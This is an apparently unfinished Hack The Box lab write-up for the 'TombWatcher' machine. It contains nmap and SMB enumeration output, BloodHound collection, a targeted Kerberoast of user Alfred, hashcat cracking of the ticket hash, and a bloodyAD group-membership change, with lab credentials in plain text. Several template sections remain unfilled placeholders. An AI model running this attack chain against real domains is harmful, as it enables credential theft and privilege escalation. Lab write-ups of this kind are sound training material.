
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sC -sV tombwatcher.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-24 03:23 EDT
Nmap scan report for tombwatcher.htb (10.129.144.23)
Host is up (0.053s latency).
Not shown: 987 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-24 11:23:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-24T11:25:03+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-09-24T11:25:02+00:00; +4h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-09-24T11:25:03+00:00; +4h00m02s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-09-24T11:25:02+00:00; +4h00m01s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-24T11:24:23
|_  start_date: N/A
|_clock-skew: mean: 4h00m01s, deviation: 0s, median: 4h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.40 seconds
                                                                
```

```
 nmap -p- tombwatcher.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-24 03:23 EDT
Nmap scan report for tombwatcher.htb (10.129.144.23)
Host is up (0.051s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49695/tcp open  unknown
49696/tcp open  unknown
49698/tcp open  unknown
49716/tcp open  unknown
49727/tcp open  unknown
53575/tcp open  unknown

Nmap done: 1 IP address (1 host up) sc
```

### Service Enumeration

```
nxc smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' --shares

SMB         10.129.144.23   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.129.144.23   445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.144.23   445    DC01             [*] Enumerated shares
SMB         10.129.144.23   445    DC01             Share           Permissions     Remark
SMB         10.129.144.23   445    DC01             -----           -----------     ------
SMB         10.129.144.23   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.144.23   445    DC01             C$                              Default share
SMB         10.129.144.23   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.144.23   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.144.23   445    DC01             SYSVOL          READ            Logon server share 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/tombwatcher]
└─$ 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/tombwatcher]
└─$ nxc smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' --users 
SMB         10.129.144.23   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.129.144.23   445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.144.23   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.144.23   445    DC01             Administrator                 2025-04-25 14:56:03 0       Built-in account for administering the computer/domain 
SMB         10.129.144.23   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.144.23   445    DC01             krbtgt                        2024-11-16 00:02:28 0       Key Distribution Center Service Account 
SMB         10.129.144.23   445    DC01             Henry                         2025-05-12 15:17:03 0        
SMB         10.129.144.23   445    DC01             Alfred                        2025-05-12 15:17:03 0        
SMB         10.129.144.23   445    DC01             sam                           2025-05-12 15:17:03 0        
SMB         10.129.144.23   445    DC01             john                          2025-05-19 13:25:10 0        
SMB         10.129.144.23   445    DC01             [*] Enumerated 7 local users: TOMBWATCHER

```

## BloodHound enumeration

```
sudo bloodhound-python -u henry -p 'H3nry_987TGV!' -ns 10.129.144.23 -d tombwatcher.htb -c all --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Testing resolved hostname connectivity dead:beef::522b:13ff:a3a4:845f
INFO: Trying LDAP connection to dead:beef::522b:13ff:a3a4:845f
INFO: Testing resolved hostname connectivity dead:beef::127
INFO: Trying LDAP connection to dead:beef::127
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Testing resolved hostname connectivity dead:beef::522b:13ff:a3a4:845f
INFO: Trying LDAP connection to dead:beef::522b:13ff:a3a4:845f
INFO: Testing resolved hostname connectivity dead:beef::127
INFO: Trying LDAP connection to dead:beef::127
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 15S
INFO: Compressing output into 20260924033424_bloodhound.zip

```

---
## Lateral movement from herny to alfred

### targeted kerberoast

Description of the vulnerability exploited.

### Exploitation

Step-by-step exploitation with commands.

```shell
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
Traceback (most recent call last):
  File "/home/kali/tools/targetedKerberoast/targetedKerberoast.py", line 597, in main
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=userName, password=args.auth_password, domain=args.auth_domain, lmhash=None, nthash=auth_nt_hash,
                                             ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                            aesKey=args.auth_aes_key, kdcHost=args.dc_ip)
                                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 323, in getKerberosTGT
    tgt = sendReceive(encoder.encode(asReq), domain, kdcHost)
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 93, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
                                                                                                                    
┌──(kali㉿kali)-[~/tools/targetedKerberoast]
└─$ sudo ntpdate tombwatcher.htb
[sudo] password for kali: 
2026-09-24 07:52:50.481026 (-0400) +14400.376862 +/- 0.022918 tombwatcher.htb 10.129.144.23 s1 no-leap
CLOCK: time stepped by 14400.376862
                                                                                                                    
┌──(kali㉿kali)-[~/tools/targetedKerberoast]
└─$ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$bfb3189a3daf3e1c3ea05b2b6f8a47ca$1decb5a4a107e8fc3c349f302ae17388a50cbdc4ecf4e99fb5cf48b5eccfe59f8d1e238ea3cd51d9df1c7a57fcb56fcbab697f0e33afef58217e617c81df10dd4036c3246026c6e01bd6696aa14595d4030ee0994dec5cb78acfbe0da923eb203a6dd09b4307705cff3e11dc8acb91b33aa8bcd57451e374a203038ae01aab7b5188af4e9b26e6abbd98dfd9c0ac960140250c6de273e596e6add5f2b2624bd2aae73b95de6d2f27ff1d6ffdfc6057bbe4169e490e264723f175f8ad05e8fac03253b6bcc6780c9eb1c26b25142a842d7ce8fd432222b14f267c0c899b148c651cf2e43ecc671c52e398b34af275f6c943b375ff10e316c6e25386b5333a51d86379b99c6f1b7eda4e0f90a793be1a24d982868a7fd571e2d974cd32ef8c7fb5076b1aa009bc198a52c97bdd9624ca59df789fbbfa5360f9f6c95a7270a26d385019c9017dbe479d38cc38e45ccc5bc89fe5ff57c30e949d48aeeb91944df54cb07ee2df01f53e90d6f8dca57cde899e34b4671fc14a7c5a14fda57b52c3e328d6442fb910594550988d4f462ca9a331d5813afbc5aec5005341fa6f2b4791ae8b2989a3f6c9868086c83e24d2f2361d0c3d78b0819da2b4054153fa845997c4f13e8bab6e0a445b3a50394b285475c7dabe9ec30b66b13329ec9701851c2bc811fdfc9c400c57f6980f2841323c47bffd061c7a1eba81a628ed2218fbf9134f1309b87077ea0c1fb1724348dff56b2625819543cef8ebf753c6b10be90bff518714135cb1200fc8d0590b0f2afa84f96affc5791be469f6830eef35c619dc1a0fa10774a23de41265262747d0f7cc74bae2e7ecf86d112c83dd082b5b54de3f30d118567112cb2d4a6a0050e0750c64c3c10cef0719118f9fb697fde5cdeaf9b1c0490c66560ce69fe6450854c71ef70453976559e46de6a451aaf75e822007c70cee7b78646da6c5b5387bb17504245032a06066542fa1c8c5092d7b14a81c3cb547e23858b41ebf499750a92c3ad84ee502aea8967dbab4e57e91faf6de511e7fd227dd885f8d579b0f303935200c7936cae6788d48741a5ba5e7ff3d8d86e8a72a8f11af2c871173a58494442a1a6070ee985dc96dc8b811121a6d40ba1ffdffe4e88771aa62841e43595b312aae0d050479b9ff8b9360441c076a3f08cb6aef5ada07b96e525196303797aa71bc7e6b898ed4e701ea3e4918f6012a8d425847b261fba060a486fa93236323c81f738191a85deda9d31a12f4125d291b00e0331ab82cc75994c59cfd6da6176a695722f02562aea36ffdd956961c69200e380c9deb2aefa338a6af1fd5aebe09d4b9b7760de634934d1eafb167ead277d0f71e84d661a6fc3e5ddfd544b04cb954594565ef4375b2ac3a4b986ed00434b3009626f238c610a21590ea43f3a2d0bec6174f6a535ef43e47ca4a84eacf99e13916cec7ce354c28651bc21494deba95c7beb2023c
[VERBOSE] SPN removed successfully for (Alfred)

```

recovered creds:

```
hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i5-10310U CPU @ 1.70GHz, 1469/2939 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (968 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$bfb3189a3daf3e1c3ea05b2b6f8a47ca$1decb5a4a107e8fc3c349f302ae17388a50cbdc4ecf4e99fb5cf48b5eccfe59f8d1e238ea3cd51d9df1c7a57fcb56fcbab697f0e33afef58217e617c81df10dd4036c3246026c6e01bd6696aa14595d4030ee0994dec5cb78acfbe0da923eb203a6dd09b4307705cff3e11dc8acb91b33aa8bcd57451e374a203038ae01aab7b5188af4e9b26e6abbd98dfd9c0ac960140250c6de273e596e6add5f2b2624bd2aae73b95de6d2f27ff1d6ffdfc6057bbe4169e490e264723f175f8ad05e8fac03253b6bcc6780c9eb1c26b25142a842d7ce8fd432222b14f267c0c899b148c651cf2e43ecc671c52e398b34af275f6c943b375ff10e316c6e25386b5333a51d86379b99c6f1b7eda4e0f90a793be1a24d982868a7fd571e2d974cd32ef8c7fb5076b1aa009bc198a52c97bdd9624ca59df789fbbfa5360f9f6c95a7270a26d385019c9017dbe479d38cc38e45ccc5bc89fe5ff57c30e949d48aeeb91944df54cb07ee2df01f53e90d6f8dca57cde899e34b4671fc14a7c5a14fda57b52c3e328d6442fb910594550988d4f462ca9a331d5813afbc5aec5005341fa6f2b4791ae8b2989a3f6c9868086c83e24d2f2361d0c3d78b0819da2b4054153fa845997c4f13e8bab6e0a445b3a50394b285475c7dabe9ec30b66b13329ec9701851c2bc811fdfc9c400c57f6980f2841323c47bffd061c7a1eba81a628ed2218fbf9134f1309b87077ea0c1fb1724348dff56b2625819543cef8ebf753c6b10be90bff518714135cb1200fc8d0590b0f2afa84f96affc5791be469f6830eef35c619dc1a0fa10774a23de41265262747d0f7cc74bae2e7ecf86d112c83dd082b5b54de3f30d118567112cb2d4a6a0050e0750c64c3c10cef0719118f9fb697fde5cdeaf9b1c0490c66560ce69fe6450854c71ef70453976559e46de6a451aaf75e822007c70cee7b78646da6c5b5387bb17504245032a06066542fa1c8c5092d7b14a81c3cb547e23858b41ebf499750a92c3ad84ee502aea8967dbab4e57e91faf6de511e7fd227dd885f8d579b0f303935200c7936cae6788d48741a5ba5e7ff3d8d86e8a72a8f11af2c871173a58494442a1a6070ee985dc96dc8b811121a6d40ba1ffdffe4e88771aa62841e43595b312aae0d050479b9ff8b9360441c076a3f08cb6aef5ada07b96e525196303797aa71bc7e6b898ed4e701ea3e4918f6012a8d425847b261fba060a486fa93236323c81f738191a85deda9d31a12f4125d291b00e0331ab82cc75994c59cfd6da6176a695722f02562aea36ffdd956961c69200e380c9deb2aefa338a6af1fd5aebe09d4b9b7760de634934d1eafb167ead277d0f71e84d661a6fc3e5ddfd544b04cb954594565ef4375b2ac3a4b986ed00434b3009626f238c610a21590ea43f3a2d0bec6174f6a535ef43e47ca4a84eacf99e13916cec7ce354c28651bc21494deba95c7beb2023c:basketball
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...b2023c
Time.Started.....: Thu Sep 24 03:57:18 2026 (0 secs)
Time.Estimated...: Thu Sep 24 03:57:18 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    17362 H/s (4.28ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> lovers1
Hardware.Mon.#01.: Util: 51%

Started: Thu Sep 24 03:57:14 2026
Stopped: Thu Sep 24 03:57:20 2026
                                                          
```

`alfred:basketball`

## adding alfred to infrastructure

```
 bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball add groupMember INFRASTRUCTURE alfred                
[+] alfred added to INFRASTRUCTURE
```

---
## User Flag

### Lateral Movement (if applicable)

Steps to move from initial foothold to user access.

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)